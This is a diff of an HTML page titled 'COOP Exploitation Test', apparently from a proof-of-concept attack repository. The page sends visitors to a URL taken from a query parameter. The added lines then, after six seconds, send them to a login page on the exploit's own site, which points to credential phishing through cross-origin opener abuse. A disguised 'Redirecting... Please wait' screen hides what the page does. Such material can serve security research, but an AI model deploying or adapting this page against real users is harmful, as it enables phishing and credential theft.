@@ -1,100 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>COOP Exploitation Test</title>
-        <style>
-            body {
-                background-color: white;
-                width: 100%;
-                height: 100vh;
-                margin: 0;
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                text-align: center;
-                font-family: Arial, sans-serif;
-            }
-            .loader {
-                border: 4px solid rgba(0, 0, 0, 0.1);
-                border-left-color: #007bff;
-                border-radius: 50%;
-                width: 40px;
-                height: 40px;
-                animation: spin 1s linear infinite;
-            }
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-            .redirect-container {
-                background: white;
-                padding: 20px 30px;
-                border-radius: 8px;
-                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.15);
-                width: 400px;
-                text-align: center;
-            }
-            .message {
-                margin-top: 15px;
-                font-size: 18px;
-                color: #333;
-            }
-            .secondary-message {
-                margin-top: 15px;
-                font-size: 14px;
-                color: #666;
-            }
-            .manual-link {
-                color: #007bff;
-                text-decoration: none;
-                font-weight: bold;
-            }
-        </style>
-        <script type="text/javascript">
-            function isValidUrl(url) {
-                // Strict validation for security
-                const pattern = /^(https?:\/\/)(([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(\/[^\s]*)?$/;
-                return pattern.test(url);
-            }
-    
-            function getTargetParam() {
-                const params = new URLSearchParams(window.location.search);
-                return params.get("target") ? decodeURIComponent(params.get("target")) : null;
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>COOP Exploitation Test</title>
+    <style>
+        body {
+            background-color: white;
+            width: 100%;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .redirect-container {
+            background: white;
+            padding: 20px 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.15);
+            width: 400px;
+            text-align: center;
+        }
+        .message {
+            margin-top: 15px;
+            font-size: 18px;
+            color: #333;
+        }
+        .secondary-message {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+        .manual-link {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+    <script type="text/javascript">
+        function isValidUrl(url) {
+            // Basic URL validation
+            const pattern = /^(https?:\/\/)(([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(\/[^\s]*)?$/;
+            return pattern.test(url);
+        }
+
+        function getTargetParam() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("target") ? decodeURIComponent(params.get("target")) : null;
+        }
+
+        function redirect() {
+            const target = getTargetParam();
+            if (!target || !isValidUrl(target)) {
+                console.error("Invalid or missing target URL. Aborting redirection.");
+                return;
             }
 
-            function redirect() {
-                const target = getTargetParam();
-                if (!target || !isValidUrl(target)) {
-                    console.error("Invalid or missing target URL. Aborting redirection.");
-                    return;
-                }
+            console.log(`Opening target site: ${target}`);
+            window.location.href = target;
 
-                console.log(`Redirecting to: ${target}`);
-                window.location.href = target;
-            }
+            // After 6 seconds, redirect to login.html
+            setTimeout(() => {
+                console.log("Redirecting to login.html...");
+                window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
+            }, 6000);
+        }
 
-            function setup() {
-                setTimeout(() => {
-                    console.log("Refreshing page...");
-                    location.reload();
-                }, 5000); // Refresh after 5 seconds
-                
-                setTimeout(redirect, 3000); // Redirect after 3 seconds
-            }
+        function setup() {
+            setTimeout(() => {
+                console.log("Refreshing page...");
+                location.reload();
+            }, 5000); // Refresh after 5 seconds if nothing happens
+            
+            setTimeout(redirect, 3000); // Redirect to target after 3 seconds
+        }
 
-            window.onload = setup;
-        </script>
-    </head>
-    <body>
-        <div class="redirect-container">
-            <div class="loader"></div>
-            <p class="message">Redirecting... Please wait.</p>
-            <p class="secondary-message">
-                If the site does not redirect, <a class="manual-link" href="#" id="manual-redirect">click here</a>.
-            </p>
-        </div>
-    </body>
+        window.onload = setup;
+    </script>
+</head>
+<body>
+    <div class="redirect-container">
+        <div class="loader"></div>
+        <p class="message">Redirecting... Please wait.</p>
+        <p class="secondary-message">
+            If the site does not redirect, <a class="manual-link" href="#" id="manual-redirect">click here</a>.
+        </p>
+    </div>
+</body>
 </html>
